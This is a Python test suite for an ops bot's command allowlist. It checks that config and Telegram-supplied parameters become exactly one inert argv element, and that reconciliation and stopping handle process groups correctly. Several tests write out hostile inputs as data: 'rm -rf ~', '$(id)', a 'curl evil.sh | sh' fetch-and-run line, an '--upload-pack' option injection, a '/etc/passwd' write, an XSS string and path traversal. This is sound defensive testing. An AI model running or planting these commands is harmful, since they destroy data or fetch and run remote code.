#!/usr/bin/env python3
"""The ops bot's allowlist is the only thing between a Telegram message and a process.

Everything here is about one rule: a validated parameter becomes exactly one argv element, and
nothing else can. The dangerous failure is not a crash — it is an argument that quietly grows into
a second argument, an option, or something a shell would interpret. So the tests push the shapes
that would do that (`-C{repo}`, `{a}{b}`, `; rm -rf ~`, `$(id)`, `--upload-pack=…`) and assert they
are either refused or inert.

Config validation is exercised through `load()` against real files, because a rule that only holds
in a unit-tested helper is a rule the config format does not actually have.
"""
import json
import os
import sys
import tempfile
import time
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "relay"))

import ops_config  # noqa: E402
import ops_supervisor as sup  # noqa: E402
from ops_config import ConfigError, build_argv  # noqa: E402


def write_config(**sections) -> str:
    handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
    json.dump(sections, handle)
    handle.close()
    return handle.name


def load(**sections):
    return ops_config.load(write_config(**sections))


def one_command(**overrides):
    """A minimal valid command, with the field under test replaced."""
    return {"commands": {"c": {"argv": ["/bin/echo", "{v}"],
                               "params": {"v": {"re": r"[a-z]+"}}, **overrides}}}


class PlaceholderShape(unittest.TestCase):
    """A placeholder is a whole argv element or the config does not load."""

    def test_a_placeholder_glued_to_a_flag_is_refused_at_load(self):
        with self.assertRaises(ConfigError) as caught:
            load(commands={"c": {"argv": ["git", "-C{repo}"],
                                 "params": {"repo": {"enum": ["/tmp"]}}}})
        self.assertIn("whole argv element", caught.exception.message)
        self.assertEqual("commands.c.argv", caught.exception.path)

    def test_two_placeholders_in_one_element_are_refused(self):
        with self.assertRaises(ConfigError):
            load(commands={"c": {"argv": ["/bin/echo", "{a}{b}"],
                                 "params": {"a": {"re": "x"}, "b": {"re": "y"}}}})

    def test_a_placeholder_with_no_param_is_refused(self):
        with self.assertRaises(ConfigError) as caught:
            load(commands={"c": {"argv": ["/bin/echo", "{v}"]}})
        self.assertIn("no params entry", caught.exception.message)

    def test_a_param_never_used_is_refused(self):
        with self.assertRaises(ConfigError) as caught:
            load(commands={"c": {"argv": ["/bin/echo"], "params": {"v": {"re": "x"}}}})
        self.assertIn("never used", caught.exception.message)

    def test_a_whole_element_placeholder_loads(self):
        cfg = load(**one_command())
        self.assertEqual(["/bin/echo", "{v}"], cfg.commands["c"].argv)


class ConfigValidation(unittest.TestCase):

    def test_two_health_probes_is_an_error(self):
        with self.assertRaises(ConfigError) as caught:
            load(services={"s": {"start": ["/bin/sh"], "health": {"tcp": 1, "pgrep": "x"}}})
        self.assertEqual("services.s.health", caught.exception.path)

    def test_no_health_probe_is_an_error(self):
        with self.assertRaises(ConfigError):
            load(services={"s": {"start": ["/bin/sh"]}})

    def test_a_service_with_neither_start_nor_unit_is_monitor_only(self):
        cfg = load(services={"tunnel": {"health": {"pgrep": "cloudflared"}}})
        self.assertEqual([], cfg.services["tunnel"].start)

    def test_a_missing_binary_is_named(self):
        with self.assertRaises(ConfigError) as caught:
            load(commands={"c": {"argv": ["/nope/definitely-not-here"]}})
        self.assertIn("definitely-not-here", caught.exception.message)

    def test_a_bad_tier_is_an_error(self):
        with self.assertRaises(ConfigError):
            load(**one_command(tier="admin"))

    def test_a_param_with_two_kinds_is_an_error(self):
        with self.assertRaises(ConfigError):
            load(commands={"c": {"argv": ["/bin/echo", "{v}"],
                                 "params": {"v": {"re": "x", "enum": ["y"]}}}})

    def test_chat_ids_must_be_integers(self):
        with self.assertRaises(ConfigError):
            load(chat_ids=["123"])

    def test_an_unknown_limit_is_an_error(self):
        with self.assertRaises(ConfigError):
            load(limits={"stream_forever": 1})

    def test_missing_file_names_the_example(self):
        with self.assertRaises(ConfigError) as caught:
            ops_config.load("/nope/ops.json")
        self.assertIn("ops.example.json", caught.exception.message)

    def test_the_shipped_example_is_valid(self):
        cfg = ops_config.load(str(ROOT / "relay" / "ops.example.json"))
        self.assertIn("relay", cfg.services)
        self.assertEqual(set(), cfg.chat_ids)   # ships closed: nothing is authorized by default


class ParameterValidation(unittest.TestCase):

    def command(self, spec):
        return ops_config.Command(name="c", argv=["/bin/echo", "{v}"], params={"v": spec})

    def test_enum_rejects_a_near_miss(self):
        cmd = self.command({"enum": ["/tmp"]})
        with self.assertRaises(ValueError) as caught:
            build_argv(cmd, ["/tmp/../etc"])
        self.assertIn("must be one of", str(caught.exception))

    def test_int_rejects_out_of_range_and_non_decimal(self):
        cmd = self.command({"int": [1, 50]})
        for bad in ["0", "51", "5x", " 5", "", "1e3", "0x10"]:
            with self.subTest(bad=bad), self.assertRaises(ValueError):
                build_argv(cmd, [bad])
        self.assertEqual(["/bin/echo", "50"], build_argv(cmd, ["50"]))

    def test_re_must_match_the_whole_value(self):
        cmd = self.command({"re": r"[a-z]+"})
        with self.assertRaises(ValueError):
            build_argv(cmd, ["abc; rm -rf ~"])      # fullmatch, not search
        self.assertEqual(["/bin/echo", "abc"], build_argv(cmd, ["abc"]))

    def test_an_overlong_value_is_rejected(self):
        cmd = self.command({"re": r"[a-z]*"})
        with self.assertRaises(ValueError):
            build_argv(cmd, ["a" * 129])

    def test_the_error_does_not_echo_the_value_back(self):
        cmd = self.command({"enum": ["ok"]})
        with self.assertRaises(ValueError) as caught:
            build_argv(cmd, ["<script>alert(1)</script>"])
        self.assertNotIn("script", str(caught.exception))

    def test_arg_count_mismatch_names_the_parameters(self):
        cmd = ops_config.Command(name="git-log", argv=["/bin/echo", "{repo}", "{n}"],
                                 params={"repo": {"enum": ["/tmp"]}, "n": {"int": [1, 5]}})
        with self.assertRaises(ValueError) as caught:
            build_argv(cmd, ["/tmp"])
        self.assertIn("takes 2 parameter(s) (repo, n); got 1", str(caught.exception))


class ArgvConstruction(unittest.TestCase):
    """The substitution itself: whole elements, never concatenation."""

    def test_shell_metacharacters_survive_as_one_inert_element(self):
        # A `re` permissive enough to admit them still cannot let them become two arguments.
        cmd = ops_config.Command(name="c", argv=["/bin/echo", "--msg", "{v}", "tail"],
                                 params={"v": {"re": r".+"}})
        for hostile in ["; rm -rf ~", "$(id)", "`id`", "&& curl evil.sh | sh", "--upload-pack=x",
                        "a b c", "|tee /etc/passwd"]:
            with self.subTest(hostile=hostile):
                argv = build_argv(cmd, [hostile])
                self.assertEqual(["/bin/echo", "--msg", hostile, "tail"], argv)
                self.assertEqual(4, len(argv))        # never split, never joined

    def test_literal_elements_are_untouched(self):
        cmd = ops_config.Command(name="c", argv=["git", "-C", "{repo}", "log", "-n", "{n}"],
                                 params={"repo": {"enum": ["/tmp"]}, "n": {"int": [1, 9]}})
        self.assertEqual(["git", "-C", "/tmp", "log", "-n", "3"], build_argv(cmd, ["/tmp", "3"]))

    def test_an_enum_path_has_its_tilde_expanded(self):
        # There is no shell to do it, and the enum value was authored in the config.
        cmd = ops_config.Command(name="c", argv=["/bin/echo", "{repo}"],
                                 params={"repo": {"enum": ["~/code"]}})
        self.assertEqual([os.path.expanduser("~/code")], build_argv(cmd, ["~/code"])[1:])

    def test_a_regex_value_is_passed_through_byte_for_byte(self):
        cmd = ops_config.Command(name="c", argv=["/bin/echo", "{v}"],
                                 params={"v": {"re": r"~.*"}})
        self.assertEqual(["/bin/echo", "~/secret"], build_argv(cmd, ["~/secret"]))


class Reconciliation(unittest.TestCase):
    """A restarted bot must adopt what is running, and forget what is not."""

    def setUp(self):
        self.dir = tempfile.mkdtemp()
        os.environ["HERDR_OPS_STATE_DIR"] = self.dir

    def tearDown(self):
        os.environ.pop("HERDR_OPS_STATE_DIR", None)

    def test_a_state_file_for_a_dead_pid_is_cleared(self):
        sup.write_state("gone", {"pid": 2 ** 22 - 1, "pgid": 2 ** 22 - 1,
                                 "argv": ["/bin/sleep"], "started_at": 0})
        self.assertEqual(["gone"], sup.reconcile(["gone"]))
        self.assertIsNone(sup.read_state("gone"))

    def test_a_live_matching_process_is_kept(self):
        sup.write_state("me", {"pid": os.getpid(), "pgid": os.getpgid(0),
                               "argv": [sys.executable], "started_at": 0})
        self.assertEqual([], sup.reconcile(["me"]))
        self.assertIsNotNone(sup.read_state("me"))

    def test_a_live_pid_running_something_else_is_cleared(self):
        # pid reuse: the pid is alive, but it is not ours. Nothing may be signalled on this state.
        sup.write_state("stolen", {"pid": os.getpid(), "pgid": os.getpgid(0),
                                   "argv": ["/usr/bin/definitely-not-this"], "started_at": 0})
        self.assertEqual(["stolen"], sup.reconcile(["stolen"]))
        self.assertIsNone(sup.read_state("stolen"))

    def test_identity_check_refuses_an_unknown_pid(self):
        self.assertFalse(sup.identity_ok(2 ** 22 - 1, ["/bin/sleep"]))
        self.assertTrue(sup.identity_ok(os.getpid(), [sys.executable]))


class ProcessGroup(unittest.TestCase):
    """Stopping a service must take its children with it.

    This is the whole reason services are started with `start_new_session=True` and stopped with
    `killpg`. `start.sh` runs the relay *and* `cloudflared` and cleans both up from its EXIT trap;
    signalling only the recorded pid would leave the tunnel alive, still publishing a hostname that
    now answers 502 — the exact state the ops bot exists to get out of.
    """

    def setUp(self):
        self.dir = tempfile.mkdtemp()
        os.environ["HERDR_OPS_STATE_DIR"] = self.dir
        self.svc = ops_config.Service(
            name="fake", start=["/bin/sh", "-c", "sleep 30 & echo child $! ; wait"],
            root="/tmp", health={"pgrep": "no-such-process-pattern-here"},
            log=str(Path(self.dir) / "fake.log"))

    def tearDown(self):
        state = sup.read_state("fake")
        if state:
            try:
                os.killpg(state["pgid"], 9)
            except OSError:
                pass
        os.environ.pop("HERDR_OPS_STATE_DIR", None)

    def child_pid(self) -> int:
        for _ in range(40):
            text = Path(self.svc.log).read_text(encoding="utf-8")
            if "child " in text:
                return int(text.split("child ", 1)[1].split()[0])
            time.sleep(0.05)
        self.fail("the fake service never reported its child")

    def test_stop_kills_the_child_too(self):
        state = sup.start(self.svc)
        self.assertEqual(state["pid"], state["pgid"])   # its own group, so killpg reaches the tree
        child = self.child_pid()
        os.kill(child, 0)                               # alive before

        outcome = sup.stop(self.svc)
        self.assertIn("stopped", outcome)
        with self.assertRaises(ProcessLookupError):
            os.kill(child, 0)                           # and gone after, without being named
        self.assertIsNone(sup.read_state("fake"))

    def test_a_second_start_is_refused_rather_than_duplicating(self):
        sup.start(self.svc)
        with self.assertRaises(RuntimeError) as caught:
            sup.start(self.svc)
        self.assertIn("already running", str(caught.exception))
        sup.stop(self.svc)


if __name__ == "__main__":
    unittest.main()
